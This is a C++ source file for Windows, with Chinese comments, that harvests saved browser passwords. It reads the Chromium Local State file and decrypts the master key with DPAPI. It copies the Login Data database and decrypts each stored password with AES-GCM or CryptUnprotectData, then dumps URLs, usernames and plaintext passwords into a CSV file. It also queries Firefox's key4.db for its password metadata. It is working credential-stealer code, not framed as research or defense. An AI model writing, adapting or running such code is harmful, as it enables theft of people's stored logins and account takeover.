#include "utils.h"
#include <shlobj.h>
#include "Windows.h"
#include"wincrypt.h"
#include <cstring>
#include <algorithm>
#include<fstream>
#include <iomanip>
#include <sstream>
#include <numeric>
#include"json11.hpp"
#include"aes.h"
#include"gcm.h"
#include <filters.h>
#include <hex.h>
#include <base64.h>
#include <osrng.h>
#include<sqlite3.h>
#include<chrono>
using namespace nlohmann;
#define NOMINMAX
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0
char g_ver[20];




struct LINE {
	std::vector<uint8_t> encryptedPwd;
	std::string rawPwd;
	std::string name;
	std::string url;
	std::string createTime;


	LINE() : encryptedPwd(), rawPwd(), name(), url(), createTime() {}


	LINE(const std::vector<uint8_t>& encryptedPwd, const std::string& rawPwd,
		const std::string& name, const std::string& url, const std::string& createTime)
		: encryptedPwd(encryptedPwd), rawPwd(rawPwd), name(name), url(url), createTime(createTime) {}


	LINE(const LINE& other)
		: encryptedPwd(other.encryptedPwd), rawPwd(other.rawPwd), name(other.name), url(other.url), createTime(other.createTime) {}


	LINE& operator=(const LINE& other) {
		if (this != &other) {
			encryptedPwd = other.encryptedPwd;
			rawPwd = other.rawPwd;
			name = other.name;
			url = other.url;
			createTime = other.createTime;
		}
		return *this;
	}


	LINE(LINE&& other) noexcept
		: encryptedPwd(std::move(other.encryptedPwd)), rawPwd(std::move(other.rawPwd)),
		name(std::move(other.name)), url(std::move(other.url)), createTime(std::move(other.createTime)) {}


	LINE& operator=(LINE&& other) noexcept {
		if (this != &other) {
			encryptedPwd = std::move(other.encryptedPwd);
			rawPwd = std::move(other.rawPwd);
			name = std::move(other.name);
			url = std::move(other.url);
			createTime = std::move(other.createTime);
		}
		return *this;
	}
};

//将时间戳转为格式化字符串
std::string transferTime(const std::string& timestampstr) {
	// 将字符串转换为 uint64_t 类型的数字
	uint64_t timestamp1 = std::stoull(timestampstr);
	char buffer[30];
	memset(buffer, 0, 30);
	_i64toa(timestamp1, buffer, 10);
	return std::string(buffer);

}


// 回调函数，用于处理查询结果
int callback(void* data, int argc, char** argv, char** azColName) {
	std::vector<LINE>* result = static_cast<std::vector<LINE>*>(data);
	LINE row;
	for (int i = 0; i < argc; i++) {
		if (argv[i]) {
			switch (i) {
			case 0:
				row.url = std::string(argv[i]);
				break;
			case 1:
				row.name = std::string(argv[i]);
				break;
			case 2:
				row.encryptedPwd = std::vector<uint8_t>(reinterpret_cast<const uint8_t*>(argv[i]), reinterpret_cast<const uint8_t*>(argv[i]) + sqlite3_column_bytes(nullptr, i));
				break;
			case 3:
				row.createTime = std::string(argv[i]);
				break;
			}
		}
	}
	result->push_back(row);
	return 0;
}

// 查询数据库并返回结果
std::vector<LINE> query_database(const std::string& db_path, const std::string& sql_query) {
	sqlite3* db;
	int rc = sqlite3_open(db_path.c_str(), &db);
	if (rc) {
		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return {};
	}

	std::vector<LINE> result;

	sqlite3_stmt* stmt;
	rc = sqlite3_prepare_v2(db, sql_query.c_str(), -1, &stmt, nullptr);
	if (rc != SQLITE_OK) {
		//std::cerr << "SQL prepare error: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return {};
	}

	while (sqlite3_step(stmt) == SQLITE_ROW) {
		LINE row;
		row.url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
		row.name = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
		row.encryptedPwd = std::vector<uint8_t>(
			reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 2)),
			reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 2)) + sqlite3_column_bytes(stmt, 2)
		);
		row.createTime = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)));
		result.push_back(row);
	}

	sqlite3_finalize(stmt);
	sqlite3_close(db);
	return result;
}
// 定义嵌套的 vector 类型
using ResultType = std::vector<std::vector<std::vector<uint8_t>>>;

// 回调函数，用于处理查询结果
static int callback1(void* data, int argc, char** argv, char** azColName) {
	ResultType* result = static_cast<ResultType*>(data);

	std::vector<std::vector<uint8_t>> row;
	for (int i = 0; i < argc; ++i) {
		if (argv[i]) {
			std::vector<uint8_t> column(argv[i], argv[i] + std::strlen(argv[i]));
			row.push_back(column);
		}
		else {
			// 处理 NULL 值
			row.push_back({});
		}
	}
	result->push_back(row);

	return 0;
}

// 读取 key4.db 并执行 SQL 查询
ResultType readKey4DB(const std::string& dbPath) {
	sqlite3* db;
	char* zErrMsg = 0;
	int rc;

	// 打开数据库
	rc = sqlite3_open(dbPath.c_str(), &db);
	if (rc) {
		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return {};
	}

	// SQL 查询
	const char* sql = "SELECT item1, item2 FROM metaData WHERE id = 'password'";

	ResultType result;

	// 执行 SQL 查询
	rc = sqlite3_exec(db, sql, callback1, &result, &zErrMsg);
	if (rc != SQLITE_OK) {
		//std::cerr << "SQL error: " << zErrMsg << std::endl;
		sqlite3_free(zErrMsg);
	}

	// 关闭数据库
	sqlite3_close(db);

	return result;
}

std::string decryptAesGcm(const std::vector<uint8_t>& buff, const std::string& master_key) {
	try {
		// 提取 IV 和 payload
		if (buff.size() < 15) {
			return "";
		}

		// IV 长度为 12 字节
		byte iv[12];
		std::copy(buff.begin() + 3, buff.begin() + 15, iv);

		// 剩余部分为 payload
		size_t payload_size = buff.size() - 15;
		byte* payload = new byte[payload_size];
		std::copy(buff.begin() + 15, buff.end(), payload);

		// 创建 AES-GCM 解密器
		CryptoPP::GCM<CryptoPP::AES>::Decryption decryptor;
		decryptor.SetKeyWithIV(reinterpret_cast<const byte*>(master_key.data()), master_key.size(), iv, 12);

		// 解密数据
		std::string decrypted_pass;
		CryptoPP::StringSource ss(reinterpret_cast<const byte*>(payload), payload_size, true,
			new CryptoPP::AuthenticatedDecryptionFilter(decryptor,
				new CryptoPP::StringSink(decrypted_pass)
			) // AuthenticatedDecryptionFilter
		); // StringSource

		// 释放 payload 内存
		delete[] payload;

		// 移除后缀字节（假设后缀字节为 16 字节）
		if (decrypted_pass.size() >= 16) {
			decrypted_pass.erase(decrypted_pass.size() - 16);
		}

		return decrypted_pass;
	}
	catch (const CryptoPP::Exception& e) {
		 //std::cerr << "Error: " << e.what() << std::endl;
		return "Error!";
	}
}


std::string base64_decode(const std::string& encodedData)
{
	std::string decodedData;
	CryptoPP::StringSource ss(encodedData, true,
		new CryptoPP::Base64Decoder(
			new CryptoPP::StringSink(decodedData)
		) // Base64Decoder
	); // StringSource
	return decodedData;
}
//调用win32crypt解码
std::string decryptData(const std::vector<uint8_t>& encryptedData) {
	DATA_BLOB inData;
	DATA_BLOB outData;

	// 将输入字符串转换为 DATA_BLOB
	inData.pbData = (BYTE*)encryptedData.data();
	inData.cbData = encryptedData.size();

	// 调用 CryptUnprotectData 进行解密
	if (!CryptUnprotectData(&inData, NULL, NULL, NULL, NULL, 0, &outData)) {
		DWORD errorCode = GetLastError();
		printf("CryptUnprotectData failed with error code:%d\n", errorCode);
		return "";
	}

	// 将解密后的数据转换为字符串
	std::string decryptedData(reinterpret_cast<char*>(outData.pbData), outData.cbData);

	// 释放分配的内存
	LocalFree(outData.pbData);

	return decryptedData;
}

//解码密码
std::string decryptAllValue(const std::vector<uint8_t>& encryptPwd, const std::string& master_key)
{
	//使用aes_gcm加密
	//chrome内核大于80
	if (std::string(encryptPwd.begin(), encryptPwd.begin() + 3) == "v10") {
		return decryptAesGcm(encryptPwd, master_key);
	}
	else
	{
		// 使用 Windows API 解密
		return decryptData(encryptPwd);
	}
}

bool copyFile(const std::string& sourceFile, const std::string& targetFile)
{
	std::ifstream inputFile(sourceFile, std::ios::binary);
	std::ofstream outputFile(targetFile, std::ios::binary);

	if (!inputFile.is_open()) {
		//std::cerr << "Error: Unable to open source file." << std::endl;
		return false;
	}

	if (!outputFile.is_open()) {
		//std::cerr << "Error: Unable to open target file." << std::endl;
		return false;
	}

	char buffer[1024];
	while (inputFile.read(buffer, sizeof(buffer))) {
		outputFile.write(buffer, inputFile.gcount());
	}

	inputFile.close();
	outputFile.close();
	return true;
}


//获取主密钥
std::string get_master_key(const std::string& local_state_path) {
	std::ifstream file(local_state_path);
	if (!file.is_open()) {
		throw std::runtime_error("Failed to open file: " + local_state_path);
	}

	std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
	file.close();
	std::string err;
	json js = json::parse(content.c_str());
	std::string key = js["os_crypt"]["encrypted_key"];
	//base64解码
	std::string decode64 = base64_decode(key);
	decode64 = decode64.substr(5);//去除前五位字符DPAPI
	//使用windowsapi进行解码
	return decryptData(std::vector<uint8_t>(decode64.begin(), decode64.end()));
}


int read_db(const std::string& db_path, const std::string& csv_path, const std::vector<std::string>& csv_head, const std::string& sql, const std::string& master_key) {
	//储存从数据库中破解出来的数据
	std::vector<LINE>data;
	//读取所有原始数据
	copyFile(db_path, "login.db");
	/*sqlite3pp::database db("login.db");
	sqlite3pp::query qry(db, sql.c_str());
	for (sqlite3pp::query::iterator i = qry.begin(); i != qry.end(); ++i) {
		std::vector<std::string>line;
		for (int j = 0; j < qry.column_count(); ++j) {
			if (j == 1) {
				std::string acc = (*i).get<char const*>(j);
				if (acc == "8209220417") {

				}
			}
			if (j == 3) {
				line.push_back(transferTime((*i).get<char const*>(j)));
			}
			else
			line.push_back((*i).get<char const*>(j));
		}
		data.push_back(line);
	}*/
	data = query_database("login.db", sql);
	remove("login.db");
	//解密所有数据
	for (LINE& line : data) {
		line.createTime = transferTime(line.createTime);
		line.rawPwd = decryptAllValue(line.encryptedPwd, master_key);
	}
	//打开csv文件
	std::ofstream csv_file(csv_path, std::ios::out | std::ios::trunc);
	if (!csv_file) {
		return 1;
	}
	csv_file << "域名," << "账号," << "密码," << "保存时间\n";
	for (LINE& it : data) {
		csv_file << it.url << "," << it.name << "," << it.rawPwd << "," << it.createTime << "\n";
	}
	csv_file.close();
	return 0;
}

bool fileExists(const std::string& filename) {
	std::ifstream file(filename);
	return file.good();
}

int get_db_data(const std::string& db_path, const std::string& local_state_path, const std::string& csv_path, const std::vector<std::string>& csv_head, const std::string& sql) {
	
	std::string statepath = std::string(getenv("LOCALAPPDATA")) + "\\" + local_state_path;
	std::string dbpath = std::string(getenv("LOCALAPPDATA")) + "\\" + db_path;
	if (!fileExists(dbpath) || !fileExists(statepath))
		return 0;
	std::string master_key = get_master_key(statepath);
	int status = read_db(dbpath, csv_path, csv_head, sql, master_key);
	return status;
}

int get_json_data(const std::string& json_path, const std::string& csv_path, const std::vector<std::string>& csv_head) {

	return 0;
}

std::string TimeStamp(int64_t stamp) {
	std::time_t t = static_cast<std::time_t>(stamp);
	std::tm* timeInfo = std::localtime(&t);

	// 检查年份是否大于 9999
	if (1900 + timeInfo->tm_year > 9999) {
		// 返回一个特定的最大时间
		std::tm maxTime = { 0 };
		maxTime.tm_year = 9999 - 1900; // tm_year 是从 1900 开始的年数
		maxTime.tm_mon = 11;           // tm_mon 是从 0 开始的月份
		maxTime.tm_mday = 13;
		maxTime.tm_hour = 23;
		maxTime.tm_min = 59;
		maxTime.tm_sec = 59;
		timeInfo = &maxTime;
	}

	// 格式化为 "yyyy-MM-dd hh:mm:ss"
	std::ostringstream oss;
	oss << (1900 + timeInfo->tm_year) << "-"
		<< (1 + timeInfo->tm_mon) << "-"
		<< timeInfo->tm_mday << " "
		<< timeInfo->tm_hour << ":"
		<< timeInfo->tm_min << ":"
		<< timeInfo->tm_sec;

	return oss.str();
}

// TimeEpoch 函数
std::string TimeEpoch(int64_t epoch) {
	const int64_t maxTime = 99633311740000000LL; // 2049-01-01 01:01:01.001
	if (epoch > maxTime) {
		// 返回一个特定的最大时间
		std::tm maxTimeStruct = { 0 };
		maxTimeStruct.tm_year = 2049 - 1900; // tm_year 是从 1900 开始的年数
		maxTimeStruct.tm_mon = 0;            // tm_mon 是从 0 开始的月份
		maxTimeStruct.tm_mday = 1;
		maxTimeStruct.tm_hour = 1;
		maxTimeStruct.tm_min = 1;
		maxTimeStruct.tm_sec = 1;
		return TimeStamp(std::mktime(&maxTimeStruct));
	}

	// 1601-01-01 00:00:00
	std::tm baseTime = { 0 };
	baseTime.tm_year = 1601 - 1900; // tm_year 是从 1900 开始的年数
	baseTime.tm_mon = 0;            // tm_mon 是从 0 开始的月份
	baseTime.tm_mday = 1;

	// 将 epoch 转换为秒和纳秒
	int64_t seconds = epoch / 1000;
	int64_t milliseconds = epoch % 1000;

	// 使用 mktime 计算时间
	std::time_t baseT = std::mktime(&baseTime);
	std::time_t newT = baseT + seconds;

	// 获取新的时间信息
	std::tm* newTimeInfo = std::localtime(&newT);

	// 处理毫秒部分
	newTimeInfo->tm_sec += milliseconds / 1000;
	if (newTimeInfo->tm_sec >= 60) {
		newTimeInfo->tm_sec -= 60;
		newTimeInfo->tm_min++;
	}
	if (newTimeInfo->tm_min >= 60) {
		newTimeInfo->tm_min -= 60;
		newTimeInfo->tm_hour++;
	}
	if (newTimeInfo->tm_hour >= 24) {
		newTimeInfo->tm_hour -= 24;
		newTimeInfo->tm_mday++;
	}
	if (newTimeInfo->tm_mday > 31) {
		// 这里需要处理月份和年的进位，为了简化，假设每个月都是 31 天
		newTimeInfo->tm_mday -= 31;
		newTimeInfo->tm_mon++;
	}
	if (newTimeInfo->tm_mon > 11) {
		newTimeInfo->tm_mon -= 12;
		newTimeInfo->tm_year++;
	}

	// 格式化为 "yyyy-MM-dd hh:mm:ss"
	std::ostringstream oss;
	oss << (1900 + newTimeInfo->tm_year) << "-"
		<< (1 + newTimeInfo->tm_mon) << "-"
		<< newTimeInfo->tm_mday << " "
		<< newTimeInfo->tm_hour << ":"
		<< newTimeInfo->tm_min << ":"
		<< newTimeInfo->tm_sec;

	return oss.str();
}